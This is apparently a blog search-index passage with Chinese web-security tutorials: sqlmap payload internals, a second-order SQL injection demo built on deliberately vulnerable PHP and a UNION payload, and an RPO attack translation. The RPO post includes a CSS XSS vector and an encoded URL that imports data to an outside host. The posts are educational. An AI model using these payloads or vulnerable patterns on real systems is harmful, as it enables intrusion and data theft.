string</li>\n</ul>\n<h3 id=\"prefix\"><a href=\"#prefix\" class=\"headerlink\" title=\"prefix\"></a>prefix</h3><p><code>&lt;payload&gt; &lt;comment&gt;</code>添加的前缀</p>\n<h3 id=\"suffix\"><a href=\"#suffix\" class=\"headerlink\" title=\"suffix\"></a>suffix</h3><p><code>&lt;payload&gt; &lt;comment&gt;</code>添加的后缀</p>\n<h2 id=\"源码解析payload组合\"><a href=\"#源码解析payload组合\" class=\"headerlink\" title=\"源码解析payload组合\"></a>源码解析payload组合</h2><p>sqlmap使用<code>lib/controller/checks.py</code>文件中的<code>checkSqlInjection()</code>函数进行sql注入的测试, 其中利用test和boundary生成payload的主要代码如下，忽略其他逻辑判断</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Favoring non-string specific boundaries in case of digit-like parameter values</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> value.isdigit():</span><br><span class=\"line\">    kb.cache.intBoundaries = kb.cache.intBoundaries <span class=\"keyword\">or</span> sorted(copy.deepcopy(conf.boundaries), key=<span class=\"keyword\">lambda</span> boundary: any(_ <span class=\"keyword\">in</span> (boundary.prefix <span class=\"keyword\">or</span> <span class=\"string\">\"\"</span>) <span class=\"keyword\">or</span> _ <span class=\"keyword\">in</span> (boundary.suffix <span class=\"keyword\">or</span> <span class=\"string\">\"\"</span>) <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> (<span class=\"string\">'\"'</span>, <span class=\"string\">'\\''</span>)))</span><br><span class=\"line\">    boundaries = kb.cache.intBoundaries</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    boundaries = conf.boundaries</span><br><span class=\"line\"></span><br><span class=\"line\">tests = getSortedInjectionTests()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> tests:</span><br><span class=\"line\">    test = tests.pop(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> boundary <span class=\"keyword\">in</span> boundaries:</span><br><span class=\"line\">        injectable = <span class=\"keyword\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># Skip boundary if it does not match against test's &lt;clause&gt;</span></span><br><span class=\"line\">        <span class=\"comment\"># Parse test's &lt;clause&gt; and boundary's &lt;clause&gt;</span></span><br><span class=\"line\">        clauseMatch = <span class=\"keyword\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span> clauseTest <span class=\"keyword\">in</span> test.clause:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> clauseTest <span class=\"keyword\">in</span> boundary.clause:</span><br><span class=\"line\">                clauseMatch = <span class=\"keyword\">True</span></span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> test.clause != [<span class=\"number\">0</span>] <span class=\"keyword\">and</span> boundary.clause != [<span class=\"number\">0</span>] <span class=\"keyword\">and</span> <span class=\"keyword\">not</span> clauseMatch:</span><br><span class=\"line\">            <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># Skip boundary if it does not match against test's &lt;where&gt;</span></span><br><span class=\"line\">        <span class=\"comment\"># Parse test's &lt;where&gt; and boundary's &lt;where&gt;</span></span><br><span class=\"line\">        whereMatch = <span class=\"keyword\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span> where <span class=\"keyword\">in</span> test.where:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> where <span class=\"keyword\">in</span> boundary.where:</span><br><span class=\"line\">                whereMatch = <span class=\"keyword\">True</span></span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> whereMatch:</span><br><span class=\"line\">            <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># For each test's &lt;where&gt;</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> where <span class=\"keyword\">in</span> test.where:</span><br><span class=\"line\">            <span class=\"comment\"># generage payload</span></span><br><span class=\"line\">            templatePayload = agent.payload(..., where=where)</span><br></pre></td></tr></table></figure>\n<p>利用test和boundary生成payload的流程为:</p>\n<ul>\n<li>循环遍历每一个test,</li>\n<li>对某个test,循环遍历boundary</li>\n<li>若boundary的where包含test的where值，并且boundary的clause包含test的clause值, 则boundary和test可以匹配</li>\n<li>循环test的where值,结合匹配的boundary生成相应的payload</li>\n</ul>\n","categories":["Web安全"],"tags":["sqlmap"]},{"title":"MySQL注入系列之二次注入(三)","url":"http://www.beesfun.com/2017/03/28/MySQL注入系列之二次注入-三/","content":"<h2 id=\"二次注入原理\"><a href=\"#二次注入原理\" class=\"headerlink\" title=\"二次注入原理\"></a>二次注入原理</h2><p>二次注入漏洞字面上理解可能就是结合两个注入漏洞点实现sql注入的目的，但是这其中还有几个细节需要讲解一下。首先，第一个注入点因为经过过滤处理所以无法触发sql注入漏洞，比如<code>addslashes</code>函数，将单引号等字符转义变成\\’。但是存进数据库后，数据又被还原了，也就是反斜杠没了，在这种情况下，如果能发现一个新的注入同时引用了被插入了的数据库数据，就可以实现闭合新发现的注入漏洞引发漏洞。</p>\n<img src=\"/2017/03/28/MySQL注入系列之二次注入-三/doubleinject.png\">\n<a id=\"more\"></a>\n<h2 id=\"演示\"><a href=\"#演示\" class=\"headerlink\" title=\"演示\"></a>演示</h2><p>程序提供用户注册(<code>reg.php</code>)和邮箱搜索(<code>search.php</code>)两个功能，程序在<code>config.php</code>文件中使用<code>addslashes</code>转义所有的GPC输入，然后再将数据插入数据库中，如下图所示，用户输入含有<code>&#39;</code>的用户名会完整的存入数据库。</p>\n<img src=\"/2017/03/28/MySQL注入系列之二次注入-三/reg.png\">\n<img src=\"/2017/03/28/MySQL注入系列之二次注入-三/database.png\">\n<p><code>&#39;</code>被安全的存入了数据库，如果又将该用户名从数据库中取出来，然后再用于数据库查询，若没转义该用户名，则会出现二次注入，演示如下:</p>\n<p>搜索邮箱：<code>e@qq.com</code>, 得到mysql报错如下，显然<code>&#39;</code>引发了数据库错误，也就是说这里是可以利用sql注入的。</p>\n<img src=\"/2017/03/28/MySQL注入系列之二次注入-三/error.png\">\n<p>这里是可以利用盲注，union注入和报错注入的, 当然，注入的利用还和username等字段的长度限制有关。</p>\n<p>注册用户名: <code>&#39; union select 1,user(),2,3 #</code>, 邮箱:<code>cc@qq.com</code>, 然后搜索邮箱<code>cc@qq.com</code>, 得到如下结果:</p>\n<img src=\"/2017/03/28/MySQL注入系列之二次注入-三/user.png\">\n<h3 id=\"演示代码\"><a href=\"#演示代码\" class=\"headerlink\" title=\"演示代码\"></a>演示代码</h3><ul>\n<li>config.php</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">mysql_connect(<span class=\"string\">'localhost'</span>, <span class=\"string\">'root'</span>, <span class=\"string\">'mysql'</span>);</span><br><span class=\"line\">mysql_select_db(<span class=\"string\">'sqlinject'</span>);</span><br><span class=\"line\">mysql_set_charset(<span class=\"string\">'utf-8'</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (!get_magic_quotes_gpc())&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>($_GET))&#123;</span><br><span class=\"line\">        $_GET = addslashes_deep($_GET);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>($_POST))&#123;</span><br><span class=\"line\">        $_POST = addslashes_deep($_POST);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $_COOKIE = addslashes_deep($_COOKIE);</span><br><span class=\"line\">    $_REQUEST = addslashes_deep($_REQUEST);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">addslashes_deep</span><span class=\"params\">($value)</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">empty</span>($value))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> $value;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> is_array($value) ? array_map(<span class=\"string\">'addslashes_deep'</span>, $value): addslashes($value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>reg.php</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">\"config.php\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">empty</span>($_POST[<span class=\"string\">'submit'</span>]))&#123;</span><br><span class=\"line\">    $username = $_POST[<span class=\"string\">'username'</span>];</span><br><span class=\"line\">    $password = $_POST[<span class=\"string\">'password'</span>];</span><br><span class=\"line\">    $email = $_POST[<span class=\"string\">'email'</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    $sql = <span class=\"string\">\"INSERT INTO `sqlinject`.`users` (`id`, `username`, `password`, `email`)</span></span><br><span class=\"line\"><span class=\"string\">           VALUE (NULL, '$username', '$password', '$email');\"</span>;</span><br><span class=\"line\">    $row = mysql_query($sql);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($row)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"注册成功\"</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"注册失败\"</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;meta http-equiv=<span class=\"string\">\"Content-Type\"</span> content=<span class=\"string\">\"text/html; charset=UTF-8\"</span> /&gt;</span><br><span class=\"line\">&lt;form action=<span class=\"string\">\"\"</span> method=<span class=\"string\">\"POST\"</span>&gt;</span><br><span class=\"line\">    username&lt;input type=<span class=\"string\">\"text\"</span> name=<span class=\"string\">\"username\"</span>&gt;&lt;br/&gt;</span><br><span class=\"line\">    password&lt;input type=<span class=\"string\">\"text\"</span> name=<span class=\"string\">\"password\"</span>&gt;&lt;br/&gt;</span><br><span class=\"line\">    email&lt;input type=<span class=\"string\">\"text\"</span> name=<span class=\"string\">\"email\"</span>&gt;&lt;br/&gt;</span><br><span class=\"line\">    &lt;input type=<span class=\"string\">\"submit\"</span> name=<span class=\"string\">\"submit\"</span> value=<span class=\"string\">\"ok\"</span>&gt;</span><br><span class=\"line\">&lt;/form&gt;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>search.php</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">\"config.php\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">empty</span>($_POST[<span class=\"string\">'submit'</span>]))&#123;</span><br><span class=\"line\">    $email = $_POST[<span class=\"string\">'email'</span>];</span><br><span class=\"line\">    $sql = <span class=\"string\">\"select * from users where email='&#123;$email&#125;'\"</span>;</span><br><span class=\"line\">    $row = mysql_query($sql);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($row)&#123;</span><br><span class=\"line\">        $rows = mysql_fetch_array($row);</span><br><span class=\"line\">        $username = $rows[<span class=\"string\">'username'</span>];</span><br><span class=\"line\">        $sql = <span class=\"string\">\"select * from users where username='$username'\"</span>;</span><br><span class=\"line\">        $row = mysql_query($sql) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>(mysql_error());</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ($row)&#123;</span><br><span class=\"line\">            $rows = mysql_fetch_array($row);</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> $rows[<span class=\"string\">'username'</span>].<span class=\"string\">\"&lt;br/&gt;\"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> $rows[<span class=\"string\">'password'</span>].<span class=\"string\">\"&lt;br/&gt;\"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> $rows[<span class=\"string\">'email'</span>].<span class=\"string\">\"&lt;br/&gt;\"</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;meta http-equiv=<span class=\"string\">\"Content-Type\"</span> content=<span class=\"string\">\"text/html; charset=UTF-8\"</span> /&gt;</span><br><span class=\"line\">&lt;form action=<span class=\"string\">\"\"</span> method=<span class=\"string\">\"POST\"</span>&gt;</span><br><span class=\"line\">    search email&lt;input type=<span class=\"string\">\"text\"</span> name=<span class=\"string\">\"email\"</span>&gt;&lt;br/&gt;</span><br><span class=\"line\">    &lt;input type=<span class=\"string\">\"submit\"</span> name=<span class=\"string\">\"submit\"</span> value=<span class=\"string\">\"ok\"</span>&gt;</span><br><span class=\"line\">&lt;/form&gt;</span><br></pre></td></tr></table></figure>\n","categories":["Web安全"],"tags":["MySQL注入"]},{"title":"RPO攻击","url":"http://www.beesfun.com/2017/03/27/RPO攻击/","content":"<h2 id=\"什么是RPO\"><a href=\"#什么是RPO\" class=\"headerlink\" title=\"什么是RPO\"></a>什么是RPO</h2><p>RPO(Relative Path Overwrite)相对路径覆盖，是一种利用相对URL路径覆盖目标文件的一种攻击手段。</p>\n<a id=\"more\"></a>\n<h2 id=\"google案例\"><a href=\"#google案例\" class=\"headerlink\" title=\"google案例\"></a>google案例</h2><p>翻译自<a href=\"http://blog.innerht.ml/rpo-gadgets/\" target=\"_blank\" rel=\"noopener\">http://blog.innerht.ml/rpo-gadgets/</a>.</p>\n<h3 id=\"识别RPO\"><a href=\"#识别RPO\" class=\"headerlink\" title=\"识别RPO\"></a>识别RPO</h3><p>RPO依赖于CSS解析器能够解析那些不严谨的语法内容，这是RPO攻击的基础条件，寻找RPO攻击的第一步是检查网页是否按正确的文档类型解析，然后寻找相对CSS样式的导入。</p>\n<p>作者发现Google Toolbar的一个目标URL: <code>http://www.google.com/tools/toolbar/buttons/apis/howto_guide.html</code>, 该页面用相对路径导入CSS样式。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span>  </span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span>  </span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Google Toolbar API - Guide to Making Custom Buttons<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span>  </span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">href</span>=<span class=\"string\">\"../../styles.css\"</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text/css\"</span> /&gt;</span></span><br></pre></td></tr></table></figure>\n<p>下一步是找出目标服务器解析路径的方式。对浏览器来说，目录是通过 <code>/</code> 来分隔的，然而对服务器来说，路径中包含 <code>/</code>并不意味着存在一个目录。例如，JSP接收路径参数是以<code>;</code>作为分隔符的，例如<code>http://example.com/path;/notpath</code>，而浏览器并不识别这种模式，而当做是存在目录的路径。</p>\n<p>同样，Google Toolbar也有它自己独特的解析路径的方式。在发送请求给服务器之前，会对请求进行处理并解码所有的路径，但是谷歌浏览器并不会强制转换<code>%2f</code>为<code>/</code>,因此可以将路径中的<code>/</code>替换为<code>%2f</code>。访问<code>http://www.google.com/tools/toolbar/buttons/apis%2fhowto_guide.html</code></p>\n<img src=\"/2017/03/27/RPO攻击/google_toolbar.png\">\n<p>针对上面的链接，服务器和浏览器对路径的解析是不一致的.</p>\n<ul>\n<li>服务器视角: <code>/tools/toolbar/buttons/apis/</code> + howto_guide.html</li>\n<li>浏览器视角: <code>/tools/toolbar/buttons/</code> + apis%2fhowto_guide.html</li>\n<li>导入的css样式: <code>/tools/</code> + <del>toolbar/buttons/../../</del>style.css</li>\n</ul>\n<p>以上”+”左边高亮部分表示基本路径，浏览器认为基本路径是 <code>/tools/toolbar/buttons/</code> 而不是 <code>/tools/toolbar/buttons/apis/</code>, 因此导入相对路径的样式<code>../../style.css</code> 会额外多跳一层目录路径，本应该导入css的路径为”tools/toolbar/style.css”, 而现在为”tools/style.xss”。</p>\n<p>除了跳目录以外，还能制作假目录，例如，我们想在导入的样式路径为<code>/tools/fake/styles.css</code>, 可以构造如下url:<code>http://www.google.com/tools/fake/..%2ftoolbar/buttons/apis%2fhowto_guide.html</code></p>\n<ul>\n<li>服务器视角: /tools/<del>fake/../</del>toolbar/buttons/apis/ + howto_guide.html</li>\n<li>浏览器视角: tools/fake/..%2ftoolbar/buttons/ + apis%2fhowto_guide.html</li>\n<li>导入的css样式: /tools/fake/<del>..%2ftoolbar/buttons/../../</del> + style.css</li>\n</ul>\n<p>这里我们添加了两个虚假的路径:<code>fake/</code>和<code>..%2f</code>, 以便他们能在服务器相互抵消，同时浏览器认为<code>fake/</code>是一个真实的目录，并且，<code>..%2ftoobar</code>是另外一个目录。理论上，我们可以再根路径上导入任何样式，通过<code>https://www.google.com/*/styles.css</code>, 然而不幸的是代理只在<code>https://www.google.com/tools/*/styles.css</code>路径上有效，换句话说，任何在<code>/tools/</code>路径之外的路径采用编码魔术(<code>%2f</code>代替<code>/</code>)将不起作用, 也就是说，只能在<code>https://www.google.com/tools/*/styles.css.</code>导入任何样式。</p>\n<p>我试图四处寻找，发现任何url都是静态的，除了,<br><code>http://www.google.com/tools/toolbar/buttons/gallery</code>会重定向到<code>http://www.google.com/gadgets/directory?synd=toolbar&amp;frontpage=1</code>。现在事情变得有趣了，参数<code>q</code>是作为搜索参数，并且反应在页面上，让我们注入一个简单的payload:<code>http://www.google.com/gadgets/directory?synd=toolbar&amp;frontpage=1&amp;q=%0a{}*{background:red}</code></p>\n<img src=\"/2017/03/27/RPO攻击/q_red.png\">\n<p>这非常棒，只要我们能通过某种方式导入样式参数<code>q</code>. 最后一步是找出如何在我们引用它作为样式的同时，维持查询字符串。RPO需要持续的注入,因为导入样式表并不包含查询字符串本身。但是由于路径解码的行为，我们能使用如下payload导入样式。</p>\n<p><code>http://www.google.com/tools/toolbar/buttons%2fgallery%3fq%3d%250a%257B%257D*%257Bbackground%253Ared%257D/..%2f/apis/howto_guide.html</code></p>\n<ul>\n<li>服务器视角: /tools/toolbar/buttons/<del>gallery?q=%0a{}*{background:red}/../</del>/apis/ + howto_guide.html</li>\n<li>浏览器视角: /tools/toolbar/buttons%2fgallery%3fq%3d%250a%257B%257D*%257Bbackground%253Ared%257D/..%2f/apis/ + howto_guide.html</li>\n<li><p>导入的css样式:</p>\n<ul>\n<li>/tools/toolbar/buttons%2fgallery%3fq%3d%250a%257B%257D*%257Bbackground%253Ared%257D/<del>..%2f/apis/../../</del>style.css</li>\n<li>/tools/toolbar/buttons/gallery?q=%0a{}*{background:red}/style.css</li>\n<li>/gadgets/directory?synd=toolbar&amp;frontpage=1&amp;q=%0a{}*{background:red}/style.css</li>\n</ul>\n</li>\n</ul>\n<img src=\"/2017/03/27/RPO攻击/RPO_red.png\">\n<p>我们还能做得更好么？当然，我们改变payload为 CSS XSS向量<code>expression(alert(document.domain))</code>，并启动IE8: <code>http://www.google.com/tools/toolbar/buttons%2fgallery%3fq%3d%250a%257B%257D*%257Bx%253Aexpression(alert(document.domain))%257D/..%2f/apis/</code></p>\n<img src=\"/2017/03/27/RPO攻击/rpo-expression-alert.png\">\n<h3 id=\"使用RPO加载其他页面\"><a href=\"#使用RPO加载其他页面\" class=\"headerlink\" title=\"使用RPO加载其他页面\"></a>使用RPO加载其他页面</h3><p>我们可以使用RPO去偷其他页面的数据。CSS有一个有意思的地方，在怪异模式下，松散解析适用于所有导入的样式表，只要他们同源，这开辟了一个新的可能，如果导入的样式表包含机密数据和注入点，我们就能通过CSS魔法偷走他们。但这样的页面有最低要求如下：</p>\n<ul>\n<li>注入点在机密数据之前出现</li>\n<li>注入点允许<code>%0a</code>, <code>%0c</code> 或 <code>%0d</code>，以便于解析器的状态可以从一个错误的状态中恢复过来</li>\n<li>机密数据和它周围不能包含换行符</li>\n</ul>\n<p><code>http://www.google.com/tools/toolbar/buttons%2fgallery%3fq%3d%250a%257B%257D%2540import%2527%252Fsearch%253Fnord%253D1%2526q%253D%257B%257D%25250a%2540import%252527%252F%252Finnerht.ml%253F%2522/..%2f/apis/howto_guide.html</code></p>\n\n<h2 id=\"RPO-利用原理和条件\"><a href=\"#RPO-利用原理和条件\" class=\"headerlink\" title=\"RPO 利用原理和条件\"></a>RPO 利用原理和条件</h2><ul>\n<li>相对路径导入css样式</li>\n<li>浏览器解析路径和服务器不一致，浏览器将服务器返回的不是css的文件当做CSS文件解析</li>\n<li>CSS解析器忽略非法的内容</li>\n</ul>\n<h3 id=\"CSS解析器\"><a href=\"#CSS解析器\" class=\"headerlink\" title=\"CSS解析器\"></a>CSS解析器</h3><p>CSS2 规范中指出，”在某些情况下，用户代理必须忽略非法样式的一部分”，规范定义忽略意味着解析非法部分(为了找到它开始和结束的地方), 同时又当它不存在。规范其他地方又补充到，“对于混合CSS内容和其他内容的文件，CSS会忽略非法的内容”。</p>\n<p>那么，我们可以通过植入CSS代码，欺骗CSS解析器去忽略之前的不合法的语法内容，从而加载我们植入的CSS代码，最好的方法是选择一个无效的“选择器”，css会忽略之前所有的非法内容。</p>\n<p>如下有两种利用选择器去忽略非法内容的方式，原理是CSS解析器解析<code>}</code>或<code>{}</code>都将工作</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#125;*&#123;color:#ccc;&#125;</span><br><span class=\"line\">&#123;&#125;&#125;*&#123;color:#ccc;&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"Refer\"><a href=\"#Refer\" class=\"headerlink\" title=\"Refer\"></a>Refer</h2><ul>\n<li><a href=\"http://edu.aqniu.com/article/65\" target=\"_blank\" rel=\"noopener\">http://edu.aqniu.com/article/65</a></li>\n<li><a href=\"http://www.thespanner.co.uk/2014/03/21/rpo/\" target=\"_blank\" rel=\"noopener\">http://www.thespanner.co.uk/2014/03/21/rpo/</a></li>\n<li><a href=\"http://blog.innerht.ml/rpo-gadgets/\" target=\"_blank\" rel=\"noopener\">http://blog.innerht.ml/rpo-gadgets/</a></li>\n<li><a href=\"http://blog.portswigger.net/2015/02/prssi.html\" target=\"_blank\" rel=\"noopener\">http://blog.portswigger.net/2015/02/prssi.html</a></li>\n</ul>\n","categories":["Web安全"],"tags":["RPO"]},{"title":"跨域","url":"http://www.beesfun.com/2017/03/26/跨域/","content":"<h2 id=\"同源策略和跨域\"><a href=\"#同源策略和跨域\" class=\"headerlink\" title=\"同源策略和跨域\"></a>同源策略和跨域</h2><p>浏览器的同源策略限制从一个源加载的文档或脚本如何与来自另一个源的资源进行交互。同源是指：协议相同，域名相同，端口相同。同源政策的目的，是为了保证用户信息的安全，防止恶意的网站窃取数据。</p>\n<p>非同源限制: 无法读取Cookie、LocalStorage 和 IndexDB, 无法获得DOM, 不能发送AJAX 请求。</p>\n<img src=\"/2017/03/26/跨域/跨域.png\">\n<a id=\"more\"></a>\n<h2 id=\"JSONP-JSON-Padding\"><a href=\"#JSONP-JSON-Padding\" class=\"headerlink\" title=\"JSONP(JSON Padding)\"></a>JSONP(JSON Padding)</h2><p>jsonp在页面上引入不同域上的js脚本文件,利用了script标签的src属性是没有跨域的限制的，从而达到跨域访问的目的。因此它的最基本原理就是：动态添加一个<code>&lt;script&gt;</code>标签来实现。</p>\n<h3 id=\"实现\"><a href=\"#实现\" class=\"headerlink\" title=\"实现\"></a>实现</h3><p>这里是使用ajax来请求的，看起来和ajax没啥区别，其实还是有区别的。ajax的核心是通过XmlHttpRequest获取非本页内容，而jsonp的核心则是动态添加<code>&lt;script&gt;</code>标签来调用服务器提供的js脚本。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$.ajax(&#123;  </span><br><span class=\"line\">        url:&quot;http://crossdomain.com/services.php&quot;,  </span><br><span class=\"line\">        dataType:&apos;jsonp&apos;,  </span><br><span class=\"line\">        data:&apos;&apos;,  </span><br><span class=\"line\">        jsonp:&apos;callback&apos;,  </span><br><span class=\"line\">        success:function(result) &#123;  </span><br><span class=\"line\">            // some code</span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;);</span><br></pre></td></tr></table></figure>\n<p>上面的代码中，callback是必须的，callback是什么值要跟后台拿。获取到的jsonp数据格式如下：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flightHandler(&#123;</span><br><span class=\"line\">    <span class=\"string\">\"code\"</span>: <span class=\"string\">\"CA1998\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"price\"</span>: <span class=\"number\">1780</span>,</span><br><span class=\"line\">    <span 